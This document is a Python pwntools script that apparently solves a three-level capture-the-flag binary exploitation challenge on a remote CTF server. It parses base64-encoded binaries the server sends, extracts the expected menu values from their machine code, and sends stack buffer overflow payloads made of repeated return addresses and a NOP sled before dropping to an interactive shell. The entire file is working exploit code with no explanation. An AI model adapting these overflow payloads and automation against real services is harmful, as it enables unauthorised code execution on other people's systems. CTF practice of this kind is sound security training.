# -- coding: utf-8 --
from pwn import *
from bitstring import BitArray
from base64 import b64decode
context.log_level = 'debug'
context.arch = 'amd64'
# ENV
e = context.binary = ELF('./run')
# lib = ELF('libc-2.31.so')
lib = e.libc
# r = e.process()
r =remote("pwn.dvc.tf",8890)
# VARIABLE

winlv1 = 0x4011f6
winlv2 = 0x401216
winlv3 = 0x401216
retlv3 =0x000000000040101a
menu=b""
submenu=b""
buflen =b""
# H\xc7\xc2\x00\x00\x00\x00
# H\xc7\xc2?\x00\x00\x00
# H\xba\x1e%\xd5~\x1b\xb9\x1b?
# ?\x1b\xb9\x1b~\xd5%\x1e
# mov     rdx, 3F1BB91B7ED5251Eh
# mov     qword ptr [rbp+var_A0], 0
# H\xc7\x85`\xff\xff\xff\x00\x00\x00\x00
# H\xc7E\x00\x00\x00\x00\x00
# H\xc7\x85\x00\xfe\xff\xff\x00\x00\x00\x00'
# b'H\xba\x1e%\xd5~\x1b\xb9\x1b?'
# b'H\xba\x90xV4\x12\xef\xcd\xab'
# testasm =asm('''
    # mov     rdx, 0xabcdef1234567890
# ''')
# print(testasm)

def converthex(addr):
    b = (addr.hex()).rjust(16,"0")
    print("b="+ (b))
    c = b[14]+b[15]+b[12]+b[13]+b[10]+b[11]+b[8]+b[9]+b[6]+b[7]+b[4]+b[5]+b[2]+b[3]+b[0]+b[1]
    return (int("0x"+c ,base=16))

def server():
    payload = p64(winlv1)*80
    time.sleep(1)
    r.sendlineafter(b"\n",payload)
    for i in range(4):
        time.sleep(1)
        r.sendlineafter(b"payload:\n",payload)
        print(i+1, end="\t")
        
    # level2
    
    print("----------------------level22222222222222222222----------------------")
    payload = p64(winlv2)*100
    for i in range(5):
        r.recvuntil(b"payload:\n")
        menu,submenu = take_binary_lv2()
        k=str(i+1)
        time.sleep(1)
        print("lv2-menu"+ k)
        r.sendline(menu)
        time.sleep(1)
        print("lv2-Submenu"+ k)
        r.sendline((submenu))
        time.sleep(1)
        print("lv2-payload"+ k)
        r.sendline(payload)
        
    print("----------------------level3333333333333----------------------")
    payload= b""
    # lv3
    
    for i in range(10):
        print("Part-"+str(i+1))
        r.recvuntil(b"payload:\n")
        submenu,menu = take_binary_lv3()
        payload = b"\x90"*528 +p64(winlv3)*5
        k=str(i+1)
        time.sleep(1)
        print("lv3-menu"+ k)
        r.sendline(str(menu))
        time.sleep(1)
        print("lv3-Submenu"+ k)
        r.sendline(str(submenu))
        time.sleep(1)

        # pause()
        print("lv3-payload"+ k)
        r.sendline(payload)
    
    
def take_binary_lv3():
    
    data = r.recvuntil(b"=\n")
    
    print(b"data:--------------------------------------------------------------------------",end="\n")
    data = b64decode(data)
   
    print("submenu",end="\t")
    submenu = b'H\xba'
    index = data.find(submenu) 
    print(index)
    if (index>0):
        submenu = data[index+2:index+10]
        print(submenu)
        submenu = converthex(submenu)
        print(submenu)
            
    print("menu",end="\t")
    menu = b'H\xba'
    index += data[index+1:].find(menu)+1
    print(index)
    if (index>0):
        menu = data[index+2:index+10]
        print(menu)
        menu = converthex(menu)
        print(menu)
            
    with open('binarylv3', 'wb') as f:
      f.write(data)
    return submenu, menu
    
    
# =========================================================================================
def take_binary_lv2():
    
    data = r.recvuntil(b"=\n")
    print(b"data:--------------------------------------------------------------------------",end="\n")
    print(str(data))
    data = b64decode(data)

    for i in range(5):
        print("menu"+str(i),end="\t")
        menu = b'\x3c' + bytes([0x30 + i])
        index = data.find(menu)
        print(index)
        if (index>0):
            menu = bytes([0x30 + i])
            # print(menu)
            break
    for i in range(5):
        print("submenu"+str(i),end="\t")
        submenu = b'\x3c' + bytes([97 + i])
        index=data.find(submenu)
        print(index)
        if (index>0):
            submenu = bytes([97 + i])
            # print(submenu)
            break

    with open('binary', 'wb') as f:
      f.write(data)
    return menu, submenu

server()
r.interactive()
